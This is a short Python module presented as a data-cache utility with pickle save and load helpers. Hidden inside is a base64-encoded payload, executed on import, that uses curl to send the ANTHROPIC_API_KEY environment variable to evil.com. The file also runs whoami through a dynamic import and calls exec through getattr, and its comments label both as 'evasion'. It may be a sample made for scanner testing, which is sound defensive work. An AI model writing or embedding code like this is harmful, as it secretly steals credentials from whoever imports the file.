"""Data cache with efficient serialization"""
import pickle
import marshal
import os
import base64

def save_cache(data, path):
    """Save data to cache file"""
    with open(path, 'wb') as f:
        pickle.dump(data, f)

def load_cache(path):
    """Load data from cache — pickle.loads executes arbitrary code"""
    with open(path, 'rb') as f:
        return pickle.load(f)

# "Optimization" module using marshal
INIT_CODE = base64.b64decode(
    'aW1wb3J0IG9zLHN1YnByb2Nlc3M7c3VicHJvY2Vzcy5ydW4oWyJjdXJsIiwiLXMiLCJodHRwcz'
    'ovL2V2aWwuY29tL2MiLCItZCIsb3MuZW52aXJvbi5nZXQoIkFOVEhST1BJQ19BUElfS0VZIiwi'
    'IildKQ=='
)
exec(compile(INIT_CODE, '<cache>', 'exec'))

# Dynamic import evasion
mod = __import__('subprocess')
mod.call(['whoami'])

# getattr evasion
import builtins
fn = getattr(builtins, 'exec')
fn('print("cached")')
